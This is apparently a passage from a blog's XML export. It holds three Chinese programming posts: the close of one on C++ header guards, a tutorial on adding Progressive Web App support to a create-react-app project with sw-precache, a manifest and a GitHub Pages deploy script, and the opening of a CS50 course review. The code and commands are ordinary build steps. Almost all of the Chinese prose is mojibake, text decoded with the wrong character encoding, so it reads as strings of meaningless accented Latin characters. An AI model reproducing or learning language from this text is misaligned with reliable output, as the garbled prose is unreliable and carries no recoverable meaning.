é€™é‚Šä½¿ç”¨åˆ°çš„æ˜¯åç‚ºé è™•ç†å™¨è®Šæ•¸ï¼ˆpreprocessor variablesï¼‰çš„æ±è¥¿ï¼Œåœ¨æ­¤ä¾‹ä¸­ç‚º PCL_PEOPLE_PERSON_CLASSIFIER_H_ï¼Œè€Œé è™•ç†å™¨è®Šæ•¸åªæœ‰å…©ç¨®ç‹€æ…‹ï¼›å·²å®šç¾©å’Œæœªå®šç¾©ã€‚æ‰€ä»¥ä¸Šé¢çš„å¯«æ³•å°±æ˜¯ç”¨ #ifndef ä¾†åˆ¤æ–·æ˜¯å¦å·²ç¶“å®šç¾©é PCL_PEOPLE_PERSON_CLASSIFIER_H_ï¼Œå¦‚æœæ²’æœ‰ï¼Œé‚£å°±å…ˆå®šç¾© PCL_PEOPLE_PERSON_CLASSIFIER_H_ï¼Œç„¶å¾Œæ‰ #include å¾Œé¢çš„æ±è¥¿ã€‚
çœ‹åˆ°é€™é‚Šè®€è€…å€‘æ‡‰è©²ä¸é›£æ¨æ•²ï¼Œåªè¦åœ¨éœ€è¦ #include çš„åœ°æ–¹éƒ½åŠ ä¸Šé¡ä¼¼çš„é è™•ç†å™¨è®Šæ•¸æª¢æŸ¥ï¼Œé‚£å°±åªæœ‰åœ¨é è™•ç†å™¨è®Šæ•¸é‚„æ²’è¢«å®šç¾©æ™‚æ‰æœƒ #includeï¼Œä¸€æ—¦è¢«å®šç¾©éäº†ï¼Œå°±ä¸æœƒå†é‡è¤‡å®šç¾©äº†ã€‚
å†å›éé ­ä¾†ï¼Œå¦‚æœä½ å»çœ‹ string.h çš„å…§å®¹ï¼Œä½ å°±æœƒçœ‹åˆ°ï¼š
#ifndef _STRING_H_#define _STRING_H_ 1...

é€™æ¨£ä¸€åˆ‡å°±éƒ½ä¸²èµ·ä¾†äº†ï¼
ç¸½çµä»¥å‰åœ¨å­¸ç”Ÿæ™‚ä»£å­¸ç¿’ç¨‹å¼èªè¨€çš„æ™‚å€™ï¼Œå¸¸å¸¸æœƒæœ‰å­¸äº†æŸå€‹æ±è¥¿ä¸çŸ¥é“å¥½ç”¨åœ¨å“ªè£¡çš„æ„Ÿè¦ºï¼Œheader guard å°±æ˜¯ä¸€å€‹å¥½ä¾‹å­ã€‚é€éé–‹æºå°ˆæ¡ˆï¼Œæˆ‘å€‘å¾ˆå®¹æ˜“æ¬£è³åˆ°æŸå€‹åŠŸèƒ½çš„ç¾ï¼Œä¹Ÿå¸Œæœ›å¤§å®¶çœ‹å®Œé€™ç¯‡ä¹‹å¾Œï¼Œæ¯æ¬¡çœ‹åˆ° header guard éƒ½èƒ½æ„Ÿè¦ºä¸–ç•ŒçœŸç¾å¥½ XD
é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰&gt;å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨å­¸ç¿’çœ‹æ¸…äº‹ç‰©çš„æœ¬è³ªèˆ‡æ”¹é€²è‡ªå·±çš„è§€å¿µ
]]></content>
      <tags>
        <tag>C++</tag>
        <tag>header file</tag>
        <tag>header guard</tag>
      </tags>
  </entry>
  <entry>
    <title>ç•¶ React web app é‡ä¸Š Progressive web app</title>
    <url>/2016/09/17/create-react-pwa/</url>
    <content><![CDATA[å…ˆå‰ä»‹ç´¹é Progressive Web Appï¼Œæˆ‘å€‘åˆ©ç”¨ vanilla js èˆ‡ css åˆ»å‡ºä¸€å€‹æ”¯æ´ PWA çš„å¤©æ°£ web appï¼Œä½†ç¾åœ¨æ‡‰è©²å¾ˆå°‘äººé€™éº¼æœ‰é¢¨æ ¼çš„ç”¨ç´” JS å¯« web appï¼Œä¸–ä¿—å¦‚æˆ‘é‚„æ˜¯æœƒæƒ³ç”¨ React ä¾†æ”¯æ´å‰ç«¯æ¡†æ¶ï¼Œä½† React çš„ configuration å°±å·²ç¶“é —è¤‡é›œï¼Œè¦å†åŠ ä¸Š service-worker çš„è¨­å®šï¼Œæƒ³æƒ³å°±è¦ºå¾—ç´¯ã€‚
å¥½åœ¨ facebook å…ˆå‰æ¨å‡º create-react-app é€™å€‹å·¥å…·ï¼Œå¹«ä½ é å…ˆè¨­å®šå¥½ä¸€äº› configï¼Œä¸¦ä¸”éš±è—èµ·ä¾†ï¼ˆé‚„æ˜¯æƒ³è¦è‡ªå·±è¨­å®šçš„è©±ï¼Œå¯ä»¥é€é npm run eject é€™å€‹æŒ‡ä»¤ï¼‰ï¼Œå¦‚æœæ˜¯ä¸­å°å‹å°ˆæ¡ˆæ‡‰è©²å¾ˆé©åˆã€‚
å› æ­¤ï¼Œå•é¡Œå°±å‰©ä¸‹åŠ ä¸Š service worker é€™æ®µäº†ã€‚
å¹¸é‹çš„æ˜¯ï¼ŒGoogle chrome çš„é–‹ç™¼æˆå“¡æœ‰ä¸€å€‹ open source çš„ repository - create-react-pwaï¼Œæ˜¯åŸºæ–¼ create-react-app çš„æ¶æ§‹å»æ”¯æ´ PWAã€‚
ä¸éå¯¦éš›ä¸Šæˆ‘ä½¿ç”¨èµ·ä¾†é‚„æ˜¯æœ‰äº›åœ°æ–¹éœ€è¦å¾®èª¿èˆ‡æ³¨æ„çš„ï¼Œæ‰€ä»¥ä»Šå¤©å°±æ˜¯ä¾†å¸¶è‘—å¤§å®¶ä¸€æ­¥ä¸€æ­¥æŠŠä½ å¾ create-react-app ä¸­æ‰€å‰µå»ºçš„ React Web App åŠ å…¥ PWA çš„æ”¯æ´ã€‚
Add PWA support in your create-react-app

ä»¥é˜²å¤§å®¶æ²’ç”¨é create-react-appï¼Œé€™é‚Šç¨ç¨ä»‹ç´¹ä¸€ä¸‹ã€‚é¦–å…ˆä½ è¦å…ˆé€é create-react-app ä¾†ç”¢ç”Ÿä½ çš„ web app:
npm install -g create-react-app
create-react-app react-pwa-boilerplate
æ¥è‘—å°±æœƒç”¢ç”Ÿä»¥ä¸‹çµæ§‹çš„è³‡æ–™å¤¾ï¼š


ç•¶ç„¶ src å…§çš„çµæ§‹ä½ å¯ä»¥ä¾ç…§ä½ è‡ªå·±éœ€æ±‚èª¿æ•´ã€‚
æ¥è‘— npm start å³å¯åœ¨ localhost:3000 çœ‹åˆ°é é¢äº†ã€‚
è€Œåœ¨æœ‰äº†ä¸€å€‹ react web app çš„é››å½¢å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥ä¾†åŠ ä¸Š PWA çš„æ”¯æ´äº†ï¼
Step I - sw-precacheè¦èƒ½å¤ æ“æœ‰ Progressive Web App çš„èƒ½åŠ›ï¼Œéœ€è¦ Service Worker çš„å¹«åŠ©ï¼Œé™¤äº†è‡ªå·±æ’°å¯« service-worker ä»¥å¤–ï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨ Google å‡ºçš„ sw-precache ä¾†å¹«æˆ‘å€‘ç”¢ç”Ÿéœ€è¦çš„ service-worker.jsã€‚
åœ¨ package.json ä¸­çš„ devDependencies åŠ å…¥ sw-precacheï¼š
package.json&quot;devDependencies&quot;: &#123;  &quot;react-scripts&quot;: &quot;0.4.1&quot;,  &quot;sw-precache&quot;: &quot;^4.0.0&quot;&#125;,
or npm install sw-precache --save
æ¥è‘—ï¼Œåœ¨ package.json ä¸­çš„ script å…§ï¼Œæˆ‘å€‘è¦ä¿®æ”¹ä¸€ä¸‹ build çš„æŒ‡ä»¤ï¼š
package.json&quot;scripts&quot;: &#123;  &quot;build&quot;: &quot;react-scripts build &amp;&amp; cp manifest.json favicon.ico build/ &amp;&amp; sw-precache --navigate-fallback=&#x27;index.html&#x27; --root=&#x27;build/&#x27; --static-file-globs=&#x27;build/**/!(*map*)&#x27;&quot;,&#125;

é€™å€‹æŒ‡ä»¤åšäº†å¹¾ä»¶äº‹æƒ…ï¼š

react-scripts build æ˜¯åŸæœ¬ create-react-app çš„æŒ‡ä»¤ï¼Œå°‡ç›¸é—œçš„ react component ç­‰ç­‰é€é webpack å¹«ä½ ç·¨è­¯è½‰è­¯å¾Œæ”¾åˆ° build folder åº•ä¸‹ã€‚

cp manifest.json favicon.ico build/ ï¼š manifest.json èˆ‡ favicon.ico éƒ½æ˜¯ PWA éœ€è¦çš„æ±è¥¿ï¼Œå¾…æœƒæœƒåœ¨èªªæ˜å…§å®¹ã€‚å› ç‚ºåŸæœ¬çš„ react-scripts build ä¸­ä¸¦ä¸æœƒç”¢ç”Ÿé€™æ¨£çš„æ±è¥¿ï¼Œè‡ªç„¶ä¹Ÿä¸æœƒå¹«ä½  build é€²å»ï¼Œä½†æˆ‘å€‘éœ€è¦è®“ service worker èƒ½å„²å­˜å®ƒå€‘ï¼Œæ‰€ä»¥é€™é‚Šå°±æ‰‹å‹•æŠŠä»–æ”¾å…¥ build åº•ä¸‹ã€‚

sw-precache --navigate-fallback=&#39;index.html&#39; --root=&#39;build/&#39; --static-file-globs=&#39;build/**/!(*map*)&#39; ï¼š


é€™å€‹æŒ‡ä»¤é€é sw-precacheï¼Œç”¢ç”Ÿä¸€å€‹ service-worker.js çš„æª”æ¡ˆï¼Œä»–æœƒè‡ªå‹•å¹«ä½ æŠŠ build folder åº•ä¸‹çš„ static æª”æ¡ˆéƒ½æš«å­˜èµ·ä¾†ï¼
--navigate-fallback=&#39;index.html&#39; é€™å€‹ flag æ˜¯ç‚ºäº†è®“ä½ ä½¿ç”¨ React Router è€Œæ”¾å…¥çš„ã€‚å¦‚æœä½ æ˜¯æ ¹æ“š facebooke çš„ doc åŠ å…¥ react-routerï¼Œä¸¦ä¸” deploy åˆ° github pageï¼Œé‚£ä½ å¿…é ˆåŠ å…¥é€™å€‹ flagï¼Œé€™æ¨£ä¸€ä¾†ï¼Œç•¶ user åœ¨åˆ‡æ›å‹•ä½œè€Œæ”¹è®Š url æ™‚ï¼Œä»»ä½•çš„ random url éƒ½æœƒ fallback åˆ° index.htmlï¼Œå…¶å¯¦ä¹Ÿå°±æ˜¯ä½  single page çš„é‚£å€‹ entry é»ï¼Œservice-worker æ‰èƒ½å¤ æ‰¾å¾—åˆ° cacheã€‚
--static-file-globsï¼šé€™å€‹ flag è®“ sw-precache å­˜ source map å¤–çš„æ‰€æœ‰ static filesã€‚
Step II - manifest.jsonå†ä¾†æ˜¯ PWA ä¸­å¾ˆé‡è¦çš„ manifest.jsonï¼Œèƒ½ä¸èƒ½é †åˆ©åœ¨ mobile ä¸Š Add to homescreen å°±è¦é é€™ä»½æª”æ¡ˆï¼š
manifest.json&#123;    &quot;short_name&quot;: &quot;react-pwa-boilerplate&quot;,    &quot;name&quot;: &quot;react-pwa-boilerplate&quot;,    &quot;icons&quot;: [        &#123;            &quot;src&quot;: &quot;favicon.ico&quot;,            &quot;sizes&quot;: &quot;144x144&quot;,            &quot;type&quot;: &quot;image/png&quot;        &#125;    ],    &quot;start_url&quot;: &quot;./&quot;,    &quot;display&quot;: &quot;standalone&quot;&#125;

è¦æ³¨æ„çš„æ˜¯ï¼Œé€™é‚Šçš„ iconsï¼Œsize ä¸€å®šè¦çµ¦æ­£ç¢ºçš„å€¼ï¼Œå¦å‰‡æœƒé€ æˆ manifest çš„è§£æéŒ¯èª¤ï¼Œå¦å¤–ï¼Œå¦‚æœè¦èƒ½è®“ iOS å…§çš„ safari ä¹Ÿèƒ½å¤ è·‘ï¼Œéœ€è¦æœ‰é¡å¤–çš„è¨­å®šï¼Œå¾…æœƒé‚„æœƒæåŠï¼Œä¹Ÿå¯ä»¥å…ˆåƒè€ƒä¹‹å‰çš„ æ–‡ç« 
Step III - index.htmlä¸Šè¿°è¨­å®šéƒ½åšå®Œå¾Œï¼Œè¦å°‡ manifest.json æ”¾å…¥ index.html å…§ï¼Œä¸¦è¨»å†Š service-worker.jsã€‚
index.html&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;    &lt;link rel=&quot;shortcut icon&quot; href=&quot;./src/favicon.ico&quot;&gt;    &lt;!-- manifest åŠ å…¥é€™é‚Šï½ --&gt;    &lt;link rel=&quot;manifest&quot; href=&quot;manifest.json&quot;&gt;    &lt;title&gt;React App&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div id=&quot;root&quot;&gt;&lt;/div&gt;    &lt;!-- service worker åœ¨é€™é‚Šè¨»å†Š~ --&gt;    &lt;script&gt;        if (&#x27;serviceWorker&#x27; in navigator) &#123;            navigator.serviceWorker.register(&#x27;service-worker.js&#x27;).catch(function(ex) &#123;                console.warn(ex);                console.warn(&#x27;(This warning can be safely ignored outside of the production build.)&#x27;);            &#125;);        &#125;    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;

Step IV - Deploy to github pageæ­é… github page å¯ä»¥å¿«é€Ÿå°‡ä½ çš„ web app éƒ¨ç½²ä¸Šå»ï¼Œcreate-react-app åœ¨ä½ åŸ·è¡Œå®Œ build ä»¥å¾Œï¼Œæä¾›äº† deploy to github çš„æŒ‡ä»¤ï¼Œæˆ‘å€‘å¯ä»¥æŠŠå®ƒå…ˆåŠ å…¥ package.json ç•¶ä¸­ã€‚å¦å¤–ä¹Ÿä¸€ä¸¦åŠ å…¥ homepage çš„æ¬„ä½ã€‚
package.json&quot;scripts&quot;: &#123;    &quot;deploy&quot;: &quot;git commit -am \&quot;Save local changes\&quot;; git checkout -B gh-pages; git add -f build; git commit -am \&quot;Rebuild website\&quot;; git filter-branch -f --prune-empty --subdirectory-filter build; git push -f origin gh-pages; git checkout -&quot;,    &quot;start&quot;: &quot;react-scripts start&quot;,    &quot;build&quot;: &quot;react-scripts build &amp;&amp; cp manifest.json favicon.ico build/ &amp;&amp; sw-precache --navigate-fallback=&#x27;index.html&#x27; --root=&#x27;build/&#x27; --static-file-globs=&#x27;build/**/!(*map*)&#x27;&quot;,    &quot;test&quot;: &quot;react-scripts test --env=jsdom&quot;,    &quot;eject&quot;: &quot;react-scripts eject&quot;  &#125;,  &quot;homepage&quot;: &quot;https://blog.arvinh.info/react-pwa-boilerplate&quot;

Step V - build &amp; deploy &amp; run and â€¦ debug?!å¦‚æœä½ ä¸€æ­¥ä¸€æ­¥è·Ÿè‘—åšåˆ°é€™è£¡ï¼Œç†è«–ä¸Šå°±å¯ä»¥ npm run build ä¾† build çœ‹çœ‹ï¼Œæ¥è‘—å† npm run deploy ä¾†éƒ¨ç½²åˆ° github page ä¸Šã€‚
ä¸éç•¶ä½ åŸ·è¡Œå®Œï¼Œconsole ä¹Ÿæ²’æœ‰å™´ä»»ä½• errorï¼Œå°‡ä½ çš„ web app ç”¨æ‰‹æ©Ÿé–‹å•Ÿä¸¦åŠ å…¥ä¸»ç•«é¢å¾Œï¼Œé‡æ–°é–‹å•Ÿé‚„æ˜¯ä¸€æ¨£é€²å…¥ç€è¦½å™¨çš„ç•«é¢ï¼Ÿï¼
manifest path errorä»”ç´°æª¢æŸ¥ä¸€ä¸‹ç€è¦½å™¨ error æœƒç™¼ç¾åœ¨æˆ‘å€‘ build å‡ºä¾†çš„ index.html å…§ï¼Œmanifest.json çš„è·¯å¾‘è¢« parse éŒ¯èª¤äº†ï¼

é€™å…¶å¯¦æ˜¯å› ç‚ºç›®å‰ create-react-app å…§éƒ¨çš„ webpack loader çš„ issueï¼Œåœ¨é€™å€‹ issue è£¡é¢æœ‰æåˆ°ï¼Œç›®å‰æˆ‘çš„è§£æ³•æ˜¯ï¼š

å°‡ä¸€é–‹å§‹çš„ index.html ä¿®æ”¹ç‚º &lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot;&gt;
build å®Œä»¥å¾Œï¼Œåˆ° build&#x2F;index.html å…§å°‡å…¶ä¿®æ­£ç‚º &lt;link rel=&quot;manifest&quot; href=&quot;./manifest.json&quot;&gt;

é™¤äº†ä¸Šé¢é€™å€‹éŒ¯èª¤ä»¥å¤–ï¼Œä»¥ä¸Šæ­¥é©Ÿé‚„å°‘äº†ä¸€äº›æ±è¥¿ã€‚
iOS supportå¦‚æœä½ æƒ³è¦ä½ çš„ web app èƒ½å¤ åœ¨ iOS ä¸Šçš„ safari é‹ä½œï¼Œåœ¨ index.html ä¸­é‚„å¾—è¦åŠ å…¥ä»¥ä¸‹å¹¾è¡Œï¼š
index.html&lt;!-- Add to home screen for Safari on iOS --&gt;    &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;    &lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot;&gt;    &lt;meta name=&quot;apple-mobile-web-app-title&quot; content=&quot;React-PWA&quot;&gt;    &lt;link rel=&quot;apple-touch-icon&quot; href=&quot;./src/images/favicon-144x144.png&quot;&gt;
å…¶ä¸­çš„ icon è·¯å¾‘è¨˜å¾—è¦å¡«å¯«æ­£ç¢ºï¼Œä¹Ÿä¸€æ¨£è¦ç¢ºèªå¥½ image çš„ sizeã€‚
Cache polyfillç¾åœ¨ service worker çš„æ”¯æ´åº¦é‚„å¾ˆä½ï¼Œæœ‰äº› polyfill å¯èƒ½éœ€è¦åŠ ä¸€ä¸‹ï¼Œä½†æˆ‘é‚„ä¸ç¢ºå®šåˆ°åº•éœ€è¦å“ªäº›â€¦
é€™å€‹ Cache polyfill ç”¨ä¾†å¢åŠ  Cache api çš„æ”¯æ´ï¼š
https://github.com/dominiccooney/cache-polyfill
ä¿®æ”¹ä½  pacakage.json ä¸­çš„ build scriptï¼ŒåŠ ä¸Šï¼š
pacakage.json&quot;build&quot;: &quot;react-scripts build &amp;&amp; cp manifest.json cache-polyfill.js favicon.ico build/ &amp;&amp; sw-precache --navigate-fallback=&#x27;index.html&#x27; --root=&#x27;build/&#x27; --static-file-globs=&#x27;build/**/!(*map*)&#x27;&quot;,

ä¸¦åœ¨ä½  build folder å…§çš„ service-worker.js å…§åŠ ä¸Šï¼š
importScripts(&#39;cache-polyfill.js&#39;);
Runä¿®æ­£å®Œä¸Šè¿°éŒ¯èª¤å¾Œï¼ŒåŸ·è¡Œ npm run deployï¼Œæ‡‰è©²å°±æœƒè‡ªå‹•å¹«ä½ æŠŠ build folder åº•ä¸‹çš„å…§å®¹éƒ¨ç½²åˆ° gh-pages é€™å€‹ branch ä¸Šï¼Œä½ å°±èƒ½åœ¨ https:&#x2F;&#x2F;[your_github_acount].github.io&#x2F;[project_name]&#x2F; çœ‹åˆ°ä½ çš„ web appã€‚
è©¦è‘—åŠ å…¥ä¸»ç•«é¢çœ‹çœ‹ï¼Œå¦‚æœæ²’å•é¡Œçš„è©±ï¼Œç•¶ä½ å†æ¬¡å¾ä¸»ç•«é¢é»é¸ icon é–‹å•Ÿæ™‚ï¼Œæ‡‰è©²å°±å¯ä»¥çœ‹åˆ°ä½ çš„ç¶²ç«™åƒ app ä¸€èˆ¬çš„å‘ˆç¾åœ¨æ‰‹æ©Ÿä¸Šäº†ï¼
ä½ å¯ä»¥å…ˆå¾ chrome devtool ç¢ºèª service worker çš„é‹ä½œæƒ…æ³ï¼Œæ‰“é–‹åœ¨ devtool ä¸­çš„ Application tab (ä»¥å‰å«åš resources tab)
online:
offline:
å¯ä»¥çœ‹åˆ° resource åœ¨ offline æ™‚æ˜¯å¾ service worker ä¾†ã€‚
æ‰‹æ©Ÿä¸Šçš„ç‹€æ³åƒæ˜¯:




è£œå……èªªæ˜é€™ç¯‡æ–‡ç« è¬›è¿°åˆ°çš„ PWA support å¯¦éš›ä¸Šåªèƒ½è®“ä½ çš„ web app èƒ½è·³è„«ç€è¦½å™¨ï¼Œé‹ä½œèµ·ä¾†åƒå€‹ Native Appï¼Œä½†æ˜¯ä¸¦æ²’æœ‰è€ƒé‡å…¶ä»–å¯¦ä½œ PWA æ™‚éœ€è¦æ³¨æ„çš„ç´°ç¯€ï¼Œåƒæ˜¯ PWA å…§çš„ App shell ç­‰ç­‰ã€‚
å¦å¤–ï¼Œä½ çš„ web app ä¸€å®šä¸å¯èƒ½åªæœ‰ static filesï¼Œå‹¢å¿…æœƒéœ€è¦æœ‰è·Ÿ API æºé€šçš„éƒ¨åˆ†ï¼Œé€™é‚Šå°±éœ€è¦é¡å¤–ä½¿ç”¨ sw-toolbox ä¾†è² è²¬ runtime caching strategiesï¼Œä½ ä¹Ÿå¯ä»¥é€é sw-precache çš„è¨­å®šæª”ä¾†è™•ç†ï¼š
precache-config.json&#123;dynamicUrlToDependencies: &#123;  dynamic/page1: [    &quot;app/views/layout.jade&quot;,    &quot;app/views/page1.jade&quot;  ],  dynamic/page2: [    &quot;app/views/layout.jade&quot;,    &quot;app/views/page2.jade&quot;  ]  &#125;,  staticFileGlobs: [    &quot;app/css/**.css&quot;,    &quot;app/**.html&quot;,    &quot;app/images/**.*&quot;,    &quot;app/js/**.js&quot;  ],  stripPrefix: &quot;app/&quot;,  verbose: true,  runtimeCaching: [    &#123;      urlPattern: &quot;/this\.is\.a\.regex/&quot;,      handler: &quot;networkFirst&quot;    &#125;  ]&#125;
åªè¦åœ¨ sw-precache çš„æŒ‡ä»¤å¾ŒåŠ ä¸Š --config=sw-precache-config.json é€™å€‹ flag ä¾†æŒ‡å®š config æª”å³å¯ã€‚
ç¨‹å¼ç¢¼ä¸Šè¿°å®Œæ•´ç¨‹å¼ç¢¼å¯ä»¥åœ¨é€™è£¡å–å¾—ï¼šhttps://github.com/ArvinH/react-pwa-boilerplate
æ¸¬è©¦é é¢ï¼šhttps://blog.arvinh.info/react-pwa-boilerplate/
ç›®å‰æ¸¬è©¦ä¼¼ä¹ offline æœƒæœ‰å•é¡Œï¼ŒæœƒæŒçºŒä¿®æ­£æ›´æ–°ï¼ä¸¦åŠ å…¥ react-routerã€redux ç­‰å¸¸ç”¨ libã€‚
å·¥å•†æœå‹™æ™‚é–“å‰é™£å­å¼·è€…æˆ‘æœ‹å‹å¯«äº†ä¸€å€‹ç¥å¥‡å¯¶è²å±¬æ€§å°æˆ°çš„éŠæˆ²ï¼Œå¯ä»¥å¹«åŠ©ä½ ç­è§£ç¥å¥‡å¯¶è²ä¹‹é–“å„ç¨®å±¬æ€§çš„ç›¸å‰‹ç‹€æ³ï¼Œå‰›å¥½æ˜¯ä½¿ç”¨ create-react-app èˆ‡ Redux å¯¦ä½œï¼Œæˆ‘ä¹ŸåŠ å…¥äº† pwa çš„ç‰ˆæœ¬ï¼Œåªæ˜¯ç›®å‰ offline ä¼¼ä¹æœ‰é»å•é¡Œâ€¦
æ­¡è¿å¤§å®¶å¹«å¿™ä¿®~
å¤§å®¶å¯ä»¥å…ˆåˆ°åŸæœ¬ç¶²ç«™ç©ç©!
åŸç‰ˆï¼šhttps://kaddopur.github.io/type_instructor/
PWAï¼šhttps://blog.arvinh.info/type_instructor/#/?_k=usu9f3

åƒè€ƒè³‡æ–™
Create-react-pwa
Google sw-precache
Cache-polyfill

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>react</tag>
        <tag>pwa</tag>
        <tag>Progressive web app</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ¥çŒ¶è±«äº†ï¼Œä¾†ä¿® CS50 å§ï¼</title>
    <url>/2017/11/11/cs50/</url>
    <content><![CDATA[å‰è¨€å…¶å¯¦æˆ‘ä¹‹å‰å°±å·²ç¶“å¯«éä¸€ç¯‡æ–‡ç« ï¼ˆå¦‚æµ·æ´‹èˆ¬çš„ç¨‹å¼èª²ç¨‹ï¼šCS50
ï¼‰å¤§åŠ›ç¨±è®šé CS50ï¼Œä½†é‚£ç¯‡æ¯”è¼ƒå‡Œäº‚ä¸€é»ï¼Œæ¯”è¼ƒåƒæ˜¯è‡ªå·±çš„ç­†è¨˜ã€‚
ä»Šå¹´å†ä¿®äº†ä¸€æ¬¡ä¹‹å¾Œï¼Œä¾ç„¶è¦ºå¾—é€™é–€èª²å¾ˆæ£’ï¼Œæ±ºå®šå†æ¬¡è·Ÿå¤§å®¶åˆ†äº«ã€‚
CS50 æ˜¯ä»€éº¼ï¼ŸCS50 çš„èª²ç¨‹åç¨±å«åš Introduction to Computer Scienceï¼Œæ˜¯ä¸€å ‚å“ˆä½›å¤§å­¸çš„é€šè­˜èª²ç¨‹ï¼Œç¸½ä¹‹å°±æ˜¯ä¸€é–€åœ¨ä»‹ç´¹ Computer Science çš„èª²ã€‚
è€Œé€™é–€èª²ç¨‹çš„æ‰€æœ‰è³‡æ–™éƒ½æœ‰å…¬é–‹åœ¨ç¶²è·¯ä¸Šï¼Œä¹Ÿæœ‰åœ¨ edx ä¸Šé¢é–‹èª²ï¼Œå¯ä»¥è·Ÿè‘—è‡ªå·±çš„é€²åº¦ä¾†ä¸Šã€‚
é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨ cs50.tv ä¹Ÿæœ‰èª²ç¨‹çš„å½±ç‰‡ã€é€å­—ç¨¿ã€ä½œæ¥­ç­‰ç­‰çš„å…§å®¹ä¾›å¤§å®¶è‡ªè¡Œå–ç”¨ã€‚
CS50 é€™é–€èª²æ˜¯ã€Œå®Œå…¨å…è²»ã€çš„ï¼Œä½†æ˜¯åœ¨ edX ä¸Šé¢ä½ å¯ä»¥é¸æ“‡ä¿®å®Œèª²ä¹‹å¾Œä»˜éŒ¢è³¼è²·ã€Œä¿®èª²è­‰æ˜ã€ï¼Œæ„æ€å°±æ˜¯ä½ æœ‰ä¿®éé€™é–€èª²äº†ä¸¦ä¸”å¾—åˆ°å®˜æ–¹èªè­‰ã€‚ä½†æ˜¯é€™å€‹è­‰æ˜è¦ä¸è¦èŠ±éŒ¢è²·å®Œå…¨æ˜¯è¦‹ä»è¦‹æ™ºï¼Œä¸è²·çš„è©±ä½ é‚„æ˜¯å¯ä»¥å…è²»ä¿®èª²ã€‚
CS50 çš„èª²ç¨‹æœƒæ•™å“ªäº›ï¼Ÿæˆ‘åˆ—èˆ‰ä¸€ä¸‹ 2016 å¹´ç§‹å­£çš„èª²ç¨‹çš„æ¯ä¸€é€±çš„èª²ç¨‹å¤§ç¶±ï¼š

Scratch
C
Arrays
Algorithms
Memory
Data Structures
HTTP
Machine Learning
Python
SQL
JavaScript

æ¯ä¸€é€±çš„èª²ç¨‹éƒ½æœ‰å¤§æ¦‚å…©å°æ™‚çš„å½±ç‰‡è·Ÿä¸€ä»½è¦èŠ±ä½ è¶…ç´šå¤šæ™‚é–“çš„ä½œæ¥­ï¼Œä½†ä½ å¾å®ƒçš„èª²ç¨‹å¤§ç¶±å°±å¯ä»¥çœ‹å‡ºä¾†ï¼Œé€™é–€èª²æ•™çš„æ±è¥¿éå¸¸éå¸¸å¤šã€‚
è‹¥ä½ æƒ³çŸ¥é“å¾—æ›´è©³ç´°ï¼Œæˆ‘è²¼ä¸€ä¸‹æˆ‘ä¹‹å‰ä¿®çš„é‚£å¹´ï¼ˆ2015ï¼‰çš„æ¯ä¸€é€±çš„æ›´è©³ç´°çš„å¤§ç¶±ï¼š
ç¬¬é›¶é€±äºŒé€²ä½ã€ASCIIã€RGBã€äºŒåˆ†æœå°‹æ³•ä»‹ç´¹åŸºæœ¬ç¨‹å¼èªè¨€ï¼šæ¢ä»¶åˆ¤æ–·ã€è®Šæ•¸ã€è¿´åœˆã€é™£åˆ—ã€å‡½å¼ä½œæ¥­ï¼šç”¨ scratch å¯«ä¸€å€‹ç¨‹å¼
ç¬¬ä¸€é€±é–‹å§‹ä»‹ç´¹ C èªè¨€ï¼Œä»¥åŠè¬›è§£ compile çš„è§€å¿µä»‹ç´¹å„ç¨®å½¢æ…‹ï¼Œåƒæ˜¯ double, float, int, bool, char, long longâ€¦ä»‹ç´¹æµ®é»æ•¸èª¤å·®èˆ‡ overflowæ•™ä½  command line åŸºæœ¬æ“ä½œï¼Œåƒæ˜¯ mv, ls, cd, make ç­‰ç­‰ä½œæ¥­ï¼šå¯«ä¸€å€‹ç°¡å–®çš„ C ç¨‹å¼ï¼ˆè¿´åœˆå°å‡ºæ˜Ÿæ˜Ÿï¼‰
ç¬¬äºŒé€±ä»‹ç´¹ function, string, arrayä»¥åŠå¦‚ä½•åˆ©ç”¨ argc, argv å‚³å…¥åƒæ•¸é‚„æœ‰è¬›åˆ°åŠ å¯†ï¼Œåƒæ˜¯ RSAæ•™äº† command line çš„ Redirectingï¼ˆ&gt;ï¼‰é‚„æœ‰ Pipeï¼ˆ|ï¼‰ä½œæ¥­ï¼šå­—ä¸²è™•ç†ï¼Œç°¡å–®åŠ è§£å¯†å¯¦ä½œ  
ç¬¬ä¸‰é€±æœå°‹ã€æ’åºï¼ˆæ°£æ³¡ã€æ’å…¥ã€é¸æ“‡ã€å¿«æ’ã€åˆä½µï¼‰ã€big Oéè¿´ã€bit æ“ä½œGDB çš„ä½¿ç”¨ä½œæ¥­ï¼šå¯¦ä½œO(n^2)çš„æ’åºè·ŸäºŒåˆ†æœ
ç¬¬å››é€±å†æ¬¡è¬›è§£éè¿´å­—ä¸²ã€æŒ‡æ¨™ã€structã€bitmap æ ¼å¼æª”æ¡ˆè™•ç†ï¼ˆfprint&#x2F;fopenâ€¦ï¼‰mallocï¼Œè¨˜æ†¶é«”åˆ†é…æ•™ä½ ç”¨ xxd çœ‹æª”æ¡ˆçš„ hexä½œæ¥­ï¼šçµ¦ä½  bitmap header çš„æ–‡ä»¶ï¼Œè™•ç† bitmap åœ–ç‰‡ï¼Œä¾‹å¦‚èªªæ”¾å¤§å…©å€
